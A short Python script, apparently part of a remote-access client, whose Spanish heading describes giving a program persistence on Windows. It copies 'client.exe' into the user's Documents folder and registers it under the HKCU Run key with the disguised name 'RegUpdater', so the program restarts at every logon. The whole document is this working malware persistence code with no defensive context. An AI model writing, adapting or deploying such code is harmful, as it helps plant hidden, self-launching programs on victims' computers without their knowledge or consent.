#Hacer que un programa en python tenga persistencia en Windows

import socket
import os
import subprocess
import time
import shutil
import random
import winreg as wreg

def persistance():
	path = os.getcwd().strip('/n')
	Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
	
	destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
	
	if not os.path.exists(destination):
		shutil.copyfile(path+'\client.exe', destination)
		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
		wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
		key.Close()